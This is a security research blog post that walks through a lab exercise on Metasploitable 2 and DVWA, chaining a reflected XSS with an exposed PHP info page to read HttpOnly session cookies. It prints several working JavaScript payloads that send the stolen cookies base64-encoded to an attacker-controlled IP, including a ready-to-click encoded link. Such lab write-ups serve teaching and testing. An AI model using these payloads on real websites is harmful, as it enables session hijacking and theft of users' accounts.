---
layout: single
title: How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation
excerpt: "Research on how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation."
date: 2022-11-12
classes: wide
header:
  teaser: /assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png
  teaser_home_page: true
  icon:
categories:
  - research
tags:  
  - web
  - burpsuite
  - base64
  - metasploitable 2
  - xss
  - exfiltrate cookies
  - session hijacking
  - php info page
  - bypass
---

## Summary 

- [1. Setting up the environment](#section-id-1)
- [2. Hands-on!](#section-id-2)
  - [2.1. Trying to exfiltrate the cookies through the usual method](#section-id-2-1)
  - [2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page](#section-id-2-2)
  - [2.3. Using my Github tool to generate an improved payload](#section-id-2-3)
  - [2.4. Important notes](#section-id-2-4)
- [3. Conclusions](#section-id-3)

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png)
 
PHP info page disclosure is usually considered to be a low severity vulnerability but in this post I am going to show how to bypass the *HttpOnly* flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation. This file could be used to perform a session hijacking.

As far as I know, the person who discovered this bypass technique was [Aleksi Kistauri](https://aleksikistauri.medium.com/bypassing-httponly-with-phpinfo-file-4e5a8b17129b) and in this post we are going to see how to reproduce it in Metasploitable 2 with some extra requirements that I have not seen in other posts.

<div id='section-id-1'/>
## 1. Setting up the environment

We will use the intentionally vulnerable machine *Metasploitable 2*. To set up the environment follow the steps below:

1. Download the virtual machine from the link below

   [Link to download Metasploitable 2](https://www.vulnhub.com/entry/metasploitable-2,29/)

   and import the machine in VMware. If you use VirtualBox, you can do it, the virtualization software is not relevant.

2. You should have another virtual machine, preferably a Kali virtual machine.

3. Set the network adapter of your Kali and *Metasploitable 2* as Host-only.

4. Run *Metasploitable 2* and log in using the credentials msfadmin:msfadmin. 

5. Get the IP of the machine through the command ifconfig

   ![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/ifconfig.png)

6. Suposing that the IP of the *Metasploitable 2* machine is 192.168.240.129 you can access to the web from your Kali through the URL
    
    <div class="code-header">
      <button class="copy-code-button">
        Copy
      </button>
    </div>
    ```html
    http://192.168.240.129/
    ```
    
7. In the main page select the option *DVWA*, wich is the acronym of *Damn Vulnerable Web Application*

   ![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/main-page.png)

8. Log in with the credentials admin:password.

9. Configure the *Security Level* to *low*

   ![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/dvwa-security.png)
   
   and click *Submit*.

10. In the left panel select the option *XSS reflected* and write the payload

    <div class="code-header">
      <button class="copy-code-button">
        Copy
      </button>
    </div>
    ```html
    <script>alert(1)</script>
    ```

    in the text box as follows

    ![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-reflected-form.png)

    and clicking on *Submit* you will see an alert like the following

    ![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-reflected-alert.png)

    So there is an HTML context reflected XSS through GET method in the URL

    <div class="code-header">
      <button class="copy-code-button">
        Copy
      </button>
    </div>
    ```html
    http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
    ```

11. To show how the PHP info page can be used to bypass the *HttpOnly* flag, we must first have at least one cookie with the *HttpOnly* flag set to *true*. In *Metasploitable 2* is not set by defaul, that's why we have to access to the cookies in the browser (Firefox in my case) and set, for example, the *HttpOnly* of the *PHPSESSID* cookie to *true*, as you can see in the following screenshot

    ![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/cookies-settings.png)

<div id='section-id-2'/>
## 2. Hands-on!

<div id='section-id-2-1'/>
## 2.1. Trying to exfiltrate the cookies through the usual method

A very common way to access the cookies via Javascript is through the *document* property *cookie*. So if you write the payload

{% include codeHeader.html %}
```html
<script>alert(document.cookie)</script>
```

and you click on *Submit*, you are going to see all your cookies in the screen... or not?

If you make that, you are going to see only the *security* cookie, like in the following screenshot 

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/xss-cookies-alert.png)

but... Why are we not seeing the value of the *PHPSESSID* cookie? That's because the value *true* in the *HttpOnly* flag of the cookie *PHPSESSID*.

*HttpOnly* is an additional flag included in a Set-Cookie HTTP response header. Using the *HttpOnly* flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it). You can check more information about the *HttpOnly* flag in the following link

[Link of OWASP about the HttpOnly flag](https://owasp.org/www-community/HttpOnly)

For those who do not do web pentesting or who do not regularly deal with XSS, this flag may not be familiar, but for those of us who are used to looking for and reporting these vulnerabilities in bug bounty programs, this flag is the main problem we encounter when it comes to finding a real impact in an XSS.

Take a look at the following code

{% include codeHeader.html %}
```html
<script>
   var i=new Image;
   i.src="http://192.168.240.129/"+btoa(document.cookie);
</script>
```

This code is a very common way to try to exfiltrate the user cookies during an XSS exploitation. This code is executed in the client side (XSS is a client side vulnerability) and try to import a image from the IP 192.168.240.129, which is the IP of my Kali. The requested path is the user cookies encoded in *base64*. The *base64* encoding is not strictly necessary but it can be useful for passing data in URLs when the data includes non-url friendly characters.

So if we set up a web server in our Kali through the command

{% include codeHeader.html %}
```console
python3 -m http.server 80
```

like in the following screenshot

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/python-web-server.png)

and we write the payload

{% include codeHeader.html %}
```html
<script>var i=new Image;i.src="http://192.168.240.129/"+btoa(document.cookie);</script>
```

and we click *Submit*, we can see that a GET request has been printed in the web server, like in the following screenshot

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-1.png)

The path of the GET request is the *base64* encoded form of the user cookies, so decoding it with the burpsuite decoder we can get the user cookies

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-1.png)

As you can see, only the *security* cookie is displayed and not the *PHPSESSID* cookie. That's because the *HttpOnly* flag of the *PHPSESSID* cookie.

<div id='section-id-2-2'/>
## 2.2. Exfiltrating the cookies bypassing the HttpOnly flag through the PHP info page

Ok, we can't get the cookies from the *document* object. Is there another place where we can get the cookies?

In *Metasploitable 2* there is a PHP info page disclosure in the path */dvwa/phpinfo*. In my case, it's in the URL

{% include codeHeader.html %}
```html
http://192.168.240.128/dvwa/phpinfo
```

[PHP info page](https://www.php.net/manual/en/function.phpinfo.php) is a page that outputs information about PHP's configuration and is a valuable debugging tool as it contains all EGPCS (Environment, GET, POST, Cookie, Server) data. If you take a look at the page you will see that your cookies appear in several places, for example in

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-1.png)

1. Make a request to the URL 

   <div class="code-header">
      <button class="copy-code-button">
        Copy
      </button>
    </div>
   ```html
   http://192.168.240.128/dvwa/phpinfo
   ```

2. Take the portion of the PHP info page that contains the user cookies.

3. Encode this portion in *base64*.

4. Send this encoded string to the malicious server, that is, our Kali.

That is what the following code does

{% include codeHeader.html %}
```html
<script>
   var req = new XMLHttpRequest(); // Initializes the request object
   req.onload=reqListener; // Set the listener reqListener that is triggered when the response is ready
   var url="http://192.168.240.128/dvwa/phpinfo"; // Initializes the URL of the PHP info page
   req.withCredentials=true; // Send the cookie header
   req.open("GET",url,false); // The request will be sent to the PHP info page of Metasploitable 2 (192.168.240.128) through the GET method synchronously
   req.send(); // Send the request
   function reqListener() {
      var req2=new XMLHttpRequest(); // Initializes the request object
      const sess=this.responseText.substring(this.responseText.indexOf("HTTP_COOKIE")); // Store in the variable sess the result of encoding in base64 the portion of the PHP info page between the first appearance of the word HTTP_COOKIE and the final of the page
      req2.open("GET","http://192.168.240.129/?data="+btoa(sess),false); // The request will be sent to the Kali (192.168.240.129) through the GET method synchronously
      req2.send() // Send the request
   };
</script>
```

that I have taken from the blog of Aleksi Kistauri

[Link to Aleksi Kistauri's blog post](https://www.vulnhub.com/entry/metasploitable-2,29/)

making some minor modifications. This code could probably be optimized to be more precise in taking the exact part of the PHP info page that contains the cookies but it would also be longer.

So if we set up a web server in our Kali through the above command, we write the payload

{% include codeHeader.html %}
```html
<script>var req = new XMLHttpRequest();req.onload=reqListener;var url="http://192.168.240.128/dvwa/phpinfo";req.withCredentials=true;req.open("GET",url,false);req.send();function reqListener() {var req2=new XMLHttpRequest();const sess=this.responseText.substring(this.responseText.indexOf("HTTP_COOKIE"));req2.open("GET","http://192.168.240.129/?data="+btoa(sess),false);req2.send()};</script>
```

and we click on *Submit*, we can see that a GET request has been printed in the web server, like in the following screenshot

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-2.png)

The value of the parameter *data* is the *base64* encoded form of the user cookies (and a lot of HTML code but not relevant), so decoding it with the burpsuite decoder we can get the user cookies

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-2.png)

As you can see, all the cookies has been displayed, so we have bypassed the *HttpOnly* flag of the *PHPSESSID* cookie. Therefore, anyone who clicks on the URL 

{% include codeHeader.html %}
```html
http://192.168.240.128/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Evar+req+%3D+new+XMLHttpRequest%28%29%3Breq.onload%3DreqListener%3Bvar+url%3D%22http%3A%2F%2F192.168.240.128%2Fdvwa%2Fphpinfo%22%3Breq.withCredentials%3Dtrue%3Breq.open%28%22GET%22%2Curl%2Cfalse%29%3Breq.send%28%29%3Bfunction+reqListener%28%29+%7Bvar+req2%3Dnew+XMLHttpRequest%28%29%3Bconst+sess%3Dthis.responseText.substring%28this.responseText.indexOf%28%22HTTP_COOKIE%22%29%29%3Breq2.open%28%22GET%22%2C%22http%3A%2F%2F192.168.240.129%2F%3Fdata%3D%22%2Bbtoa%28sess%29%2Cfalse%29%3Breq2.send%28%29%7D%3B%3C%2Fscript%3E#
```

will be sending us their cookies associated with *DVWA*, including the session cookie and therefore we will have achieved a session hijacking.

Obviously this is a test environment and no one is going to click on that link except me, and even if someone did click on it nothing would happen because that IP address is a private IP address. But imagine this situation in a public website of an important company and an attacker sending a link like this using social engineering through Twitter, Linkedin, Facebook... and sending the user's cookies to an own server. 

Do you still think that PHP info page disclosure is not an important vulnerability?

<div id='section-id-2-3'/>
## 2.3. Using my Github tool to generate an improved payload

As you can see, the payload used in the previous section is not quite accurate since it returns not only cookies but also a lot of non-relevant HTML code. That is why I have uploaded the following tool to Github

[Link to the tool PHP-info-cookie-stealer](https://github.com/HackCommander/PHP-info-cookie-stealer)

To avoid repeating the same thing, if you want to know how the tool works you can see the README.md and you can give a star to the project :blush:. In this case, cloning the repo and running the following command

{% include codeHeader.html %}
```console
./generate-javascript-payload.sh http://192.168.240.128/dvwa/phpinfo.php http://192.168.240.129/
```

you will get the following XSS payload

{% include codeHeader.html %}
```html
<script>fetch('http://192.168.240.128/dvwa/phpinfo.php').then(response=>response.text()).then(data=>{const startString='<tr><td class="e">HTTP_COOKIE </td><td class="v">';const endString='</td></tr>';const startIndex=data.indexOf(startString)+startString.length;const endIndex=data.indexOf(endString,startIndex);const cookies=data.substring(startIndex,endIndex);const encodedCookies=btoa(cookies);fetch('http://192.168.240.129/'+'?encodedCookies='+encodedCookies,{method:'GET'});});</script>
```
This payload is much more accurate than the one used in the previous section because it sends only the cookies to the web server, without all the non-relevant HTML code. Repeating all the process of the previous section but executing this payload instead of the other one, you will receive a GET request like this

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-improved-payload.png)

The encoded cookies are sent through the encodedCookies GET parameter, so decoding it with the burpsuite decoder we can get the user cookies

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/user-cookies-exfiltrated-decoded-improved-payload.png)

As you can see, only the cookies are sent.

<div id='section-id-2-4'/>
## 2.4. Important notes

Ok, we can exfiltrate some user cookies with the flag *HttpOnly* set to *true* but... Can we exfiltrate all the user cookies of the website? The answer is **it depends**.

Go to your browser and create some test cookies like in the following screenshot

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/test-cookies.png)

Don't forget to set to *true* the *HttpOnly* flag and write the same paths of the screenshot below. If you go to the PHP info page you are going to see something like this

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-dvwa-2.png)

Not all the cookies are displayed but... Why? That's because the *path* value.

> :warning: <span style="color:red">PHP info page can be used to exfiltrate any user cookie whose path is a parent path of the path where the PHP info page is located. In other words, only cookies whose path is a prefixed path of the path in which the PHP info page is located can be exfiltrated.</span>

Taking into account that the PHP info page path is */dvwa/phpinfo* and applying this rule, we can now understand the above screenshot:

- *cookie1* appears because the path */dvwa/phpinfo* is a parent path of the PHP info page path (both are the same path).
- *cookie2* appears because the path */dvwa* is a parent path of the PHP info page path.
- *cookie3* appears because the path */* is a parent path of the PHP info page path.
- *cookie4* doesn't appear because the path */dvwa/phpinfo/test* is not a parent path of the PHP info page path.
- *cookie5* doesn't appear because the path */test* is not a parent path of the PHP info page path.

There is another PHP info page in the root path of *Metasploitable 2* as you can see in the following screenshot

![](/assets/images/2022-11-12-bypass-httponly-via-php-info-page/phpinfo-raiz-2.png)

The only cookie whose path is a parent path of the PHP info page path is *cookie3*, that's because is the only cookie displayed. You can see that the rule works.

<div id='section-id-3'/>
## 3. Conclusions

- *Metasploitable 2* is a good environment for testing certain vulnerabilities and not having to create a vulnerable environment from scratch.
- Low severity vulnerabilities such as PHP info page disclosure are usually wrongly evaluated as "low severity" is often considered synonymous with "not important".
- PHP info page disclosure can be used to bypass the *HttpOnly* flag of some user cookies and exfiltrate them during an XSS exploitation. The only requirement is that the cookie path must be a parent path of the path where the PHP info page is located.

